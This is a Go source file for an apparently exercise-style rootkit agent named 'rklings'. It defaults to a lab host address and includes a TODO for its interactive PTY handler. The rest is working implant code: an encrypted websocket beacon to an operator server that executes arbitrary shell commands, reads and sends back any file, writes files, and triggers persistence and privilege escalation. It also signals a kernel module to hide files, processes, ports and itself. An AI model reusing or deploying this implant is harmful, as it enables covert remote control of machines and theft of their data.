package main

import (
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdh"
	"crypto/rand"
	"crypto/sha256"
	"io"
	_ "embed"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"math/big"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/coder/websocket"
	"github.com/creack/pty"
	"golang.org/x/crypto/hkdf"
)

//go:embed keys/agent.key
var agentPrivKey []byte

//go:embed keys/operator.pub
var operatorPubKey []byte

var serverAddr = envOr("RKLINGS_SERVER_ADDR", "10.0.2.2:8443")

var (
	sharedKey     [32]byte
	agentPubBytes []byte
	wsConn        *websocket.Conn
	writeMu       sync.Mutex
)

func main() {
	curve := ecdh.X25519()
	priv, err := curve.NewPrivateKey(agentPrivKey)
	if err != nil {
		panic("parse agent key: " + err.Error())
	}
	agentPubBytes = priv.PublicKey().Bytes()
	sharedKey, _, err = deriveKeys(agentPrivKey, operatorPubKey)
	if err != nil {
		panic("derive keys: " + err.Error())
	}
	wsLoop()
}

// --- Crypto ---

var errCiphertextShort = errors.New("ciphertext too short")

func deriveKeys(privRaw, peerPubRaw []byte) (key [32]byte, id [8]byte, err error) {
	curve := ecdh.X25519()
	priv, err := curve.NewPrivateKey(privRaw)
	if err != nil {
		return key, id, err
	}
	pub, err := curve.NewPublicKey(peerPubRaw)
	if err != nil {
		return key, id, err
	}
	secret, err := priv.ECDH(pub)
	if err != nil {
		return key, id, err
	}
	if _, err := io.ReadFull(hkdf.New(sha256.New, secret, nil, []byte("rklings-aead")), key[:]); err != nil {
		return key, id, err
	}
	if _, err := io.ReadFull(hkdf.New(sha256.New, secret, nil, []byte("rklings-id")), id[:]); err != nil {
		return key, id, err
	}
	return
}

func sealAEAD(key [32]byte, plaintext []byte) ([]byte, error) {
	gcm, err := newGCM(key)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

func openAEAD(key [32]byte, ciphertext []byte) ([]byte, error) {
	gcm, err := newGCM(key)
	if err != nil {
		return nil, err
	}
	if len(ciphertext) < gcm.NonceSize() {
		return nil, errCiphertextShort
	}
	return gcm.Open(nil, ciphertext[:gcm.NonceSize()], ciphertext[gcm.NonceSize():], nil)
}

func newGCM(key [32]byte) (cipher.AEAD, error) {
	block, err := aes.NewCipher(key[:])
	if err != nil {
		return nil, err
	}
	return cipher.NewGCM(block)
}

// --- Wire types ---

type Command struct {
	Op   string          `json:"op"`
	Arg  string          `json:"arg,omitempty"`
	Data json.RawMessage `json:"data,omitempty"`
}

// --- Transport ---

func wsURL() string {
	scheme := "wss"
	if len(serverAddr) > 0 && (serverAddr[0] >= '0' && serverAddr[0] <= '9' || serverAddr[0] == '[') {
		scheme = "ws"
	}
	return fmt.Sprintf("%s://%s/", scheme, serverAddr)
}

func wsLoop() {
	for {
		if err := wsSession(); err != nil {
			time.Sleep(jitterDuration(2000, 5000))
		}
	}
}

func wsSession() error {
	ctx := context.Background()
	conn, _, err := websocket.Dial(ctx, wsURL(), nil)
	if err != nil {
		return err
	}
	defer conn.CloseNow()
	conn.SetReadLimit(4 << 20)

	hello, _ := json.Marshal(map[string]string{"t": "hello"})
	ct, err := sealAEAD(sharedKey, hello)
	if err != nil {
		return err
	}
	if err := conn.Write(ctx, websocket.MessageBinary, append(agentPubBytes, ct...)); err != nil {
		return err
	}

	wsConn = conn
	defer func() { wsConn = nil }()

	for {
		_, msg, err := conn.Read(ctx)
		if err != nil {
			return err
		}
		plain, err := openAEAD(sharedKey, msg)
		if err != nil {
			continue
		}
		var cmd Command
		if json.Unmarshal(plain, &cmd) != nil {
			continue
		}
		result := execute(cmd)
		if err := wsSend(map[string]any{"data": result}); err != nil {
			return err
		}
	}
}

func wsSend(v any) error {
	plain, err := json.Marshal(v)
	if err != nil {
		return err
	}
	ct, err := sealAEAD(sharedKey, plain)
	if err != nil {
		return err
	}
	writeMu.Lock()
	defer writeMu.Unlock()
	if wsConn == nil {
		return fmt.Errorf("not connected")
	}
	return wsConn.Write(context.Background(), websocket.MessageBinary, ct)
}

func jitterDuration(minMs, maxMs int64) time.Duration {
	n, _ := rand.Int(rand.Reader, big.NewInt(maxMs-minMs))
	return time.Duration(minMs+n.Int64()) * time.Millisecond
}

// --- Dispatch ---

func execute(cmd Command) any {
	switch cmd.Op {
	case "PING":
		return "PONG"
	case "STATUS":
		return handleStatusCmd()
	case "INFO":
		return handleInfoCmd()
	case "SHELL":
		return handleShellCmd(cmd.Arg)
	case "HIDE":
		return handleHideCmd(cmd.Arg)
	case "UNHIDE":
		return handleUnhideCmd(cmd.Arg)
	case "PERSIST":
		if err := mkdirCmd("persist"); err != nil {
			return fmt.Sprintf("ERR %v", err)
		}
		control.Lock()
		control.persisted = true
		control.Unlock()
		return "OK"
	case "ESCALATE":
		return handleEscalateCmd(cmd.Arg)
	case "DOWNLOAD":
		return handleDownloadCmd(cmd.Arg)
	case "UPLOAD":
		return handleUploadCmd(cmd)
	case "PTY":
		return handlePTYCmd(cmd.Arg)
	default:
		return map[string]string{"error": "unknown command"}
	}
}

// --- Handlers ---

var control = struct {
	sync.Mutex
	hidden    map[string][]string
	persisted bool
}{hidden: map[string][]string{"file": {}, "content": {}, "pid": {}, "port": {}}}

func handleStatusCmd() any {
	return map[string]int{"pid": os.Getpid(), "uid": os.Getuid()}
}

func handleInfoCmd() any {
	hostname, _ := os.Hostname()
	kernelBytes, _ := os.ReadFile("/proc/sys/kernel/osrelease")
	_, moduleExists := os.Stat("/sys/module/rklings")
	modules, _ := os.ReadFile("/proc/modules")
	control.Lock()
	hidden := make(map[string][]string, len(control.hidden))
	for kind, values := range control.hidden {
		hidden[kind] = append([]string(nil), values...)
	}
	info := map[string]any{
		"hostname":      hostname,
		"kernel":        strings.TrimSpace(string(kernelBytes)),
		"arch":          runtime.GOARCH,
		"pid":           os.Getpid(),
		"uid":           os.Getuid(),
		"persisted":     control.persisted,
		"module_hidden": moduleExists == nil && !bytes.Contains(modules, []byte("rklings ")),
		"hidden":        hidden,
	}
	control.Unlock()
	return info
}

func handleShellCmd(arg string) any {
	out, err := exec.Command("/bin/sh", "-c", arg).CombinedOutput()
	exitCode := 0
	if err != nil {
		exitCode = -1
		if cmd, ok := err.(*exec.ExitError); ok {
			exitCode = cmd.ExitCode()
		}
	}
	return map[string]any{
		"stdout":    string(out),
		"exit_code": exitCode,
	}
}

func handleDownloadCmd(arg string) any {
	path := strings.TrimSpace(arg)
	data, err := os.ReadFile(path)
	if err != nil {
		return map[string]string{"error": err.Error()}
	}
	return map[string]string{
		"data": base64.StdEncoding.EncodeToString(data),
		"size": fmt.Sprintf("%d", len(data)),
	}
}

func handleUploadCmd(cmd Command) any {
	var req struct {
		Path string `json:"path"`
		Data string `json:"data"`
	}
	if json.Unmarshal(cmd.Data, &req) != nil {
		return "ERR bad upload data"
	}
	raw, err := base64.StdEncoding.DecodeString(req.Data)
	if err != nil {
		return fmt.Sprintf("ERR decode: %v", err)
	}
	if err := os.WriteFile(req.Path, raw, 0644); err != nil {
		return fmt.Sprintf("ERR %v", err)
	}
	return "OK"
}

func handleHideCmd(arg string) any {
	if strings.TrimSpace(arg) == "MODULE" {
		if err := mkdirCmd("h.m"); err != nil {
			return fmt.Sprintf("ERR %v", err)
		}
		return "OK"
	}
	parts := strings.SplitN(arg, " ", 2)
	if len(parts) < 2 {
		return "ERR missing argument"
	}
	prefixes := map[string]string{"FILE": "h.f", "PID": "h.i", "PORT": "h.p", "CONTENT": "h.c"}
	prefix, ok := prefixes[parts[0]]
	if !ok {
		return "ERR unknown hide target"
	}
	if err := mkdirCmd(prefix + "." + parts[1]); err != nil {
		return fmt.Sprintf("ERR %v", err)
	}
	control.Lock()
	control.hidden[strings.ToLower(parts[0])] = append(control.hidden[strings.ToLower(parts[0])], parts[1])
	control.Unlock()
	return "OK"
}

func handleUnhideCmd(arg string) any {
	if strings.TrimSpace(arg) == "MODULE" {
		if err := mkdirCmd("u.m"); err != nil {
			return fmt.Sprintf("ERR %v", err)
		}
		return "OK"
	}
	parts := strings.SplitN(arg, " ", 2)
	if len(parts) < 2 {
		return "ERR missing argument"
	}
	prefixes := map[string]string{"FILE": "u.f", "PID": "u.i", "PORT": "u.p", "CONTENT": "u.c"}
	prefix, ok := prefixes[parts[0]]
	if !ok {
		return "ERR unknown unhide target"
	}
	if err := mkdirCmd(prefix + "." + parts[1]); err != nil {
		return fmt.Sprintf("ERR %v", err)
	}
	kind := strings.ToLower(parts[0])
	control.Lock()
	values := control.hidden[kind]
	for i, v := range values {
		if v == parts[1] {
			control.hidden[kind] = append(values[:i], values[i+1:]...)
			break
		}
	}
	control.Unlock()
	return "OK"
}

func handleEscalateCmd(arg string) any {
	name := "e"
	if arg != "" {
		name = "e." + arg
	}
	if err := mkdirCmd(name); err != nil {
		return fmt.Sprintf("ERR %v", err)
	}
	return "OK"
}

// --- PTY ---

// compile guard: pty is used in TODO 3
var (
	_ = pty.StartWithSize
	_ = pty.Setsize
)

var shellPTY struct {
	sync.Mutex
	file *os.File
}

func handlePTYCmd(arg string) any {
	// TODO 3: implement PTY lifecycle. Parse the sub-command from arg (START,
	// INPUT, RESIZE, CLOSE) and return values.
	//
	// START: lock shellPTY, close any existing file, create a shell with
	// pty.StartWithSize (24 rows, 80 cols), store the file, unlock, start
	// readPTYOutput goroutine, return "OK".
	//
	// INPUT: base64-decode the payload (second word of arg), lock shellPTY,
	// write to the PTY file, unlock, return "OK".
	//
	// RESIZE: parse "cols rows" from arg, lock shellPTY, call pty.Setsize,
	// unlock, return "OK".
	//
	// CLOSE: lock shellPTY, close file, nil it, unlock, return "OK".
	return "ERR implement PTY lifecycle"
}

func readPTYOutput(file *os.File) {
	buf := make([]byte, 4096)
	for {
		n, err := file.Read(buf)
		if n > 0 {
			shellPTY.Lock()
			active := shellPTY.file == file
			shellPTY.Unlock()
			if !active {
				return
			}
			wsSend(map[string]string{"pty": base64.StdEncoding.EncodeToString(buf[:n])})
		}
		if err != nil {
			return
		}
	}
}

// --- Utility ---

func mkdirCmd(name string) error {
	path := "rklings." + name
	err := os.Mkdir(path, 0755)
	_ = os.Remove(path)
	return err
}

func envOr(name, fallback string) string {
	if value := os.Getenv(name); value != "" {
		return value
	}
	return fallback
}
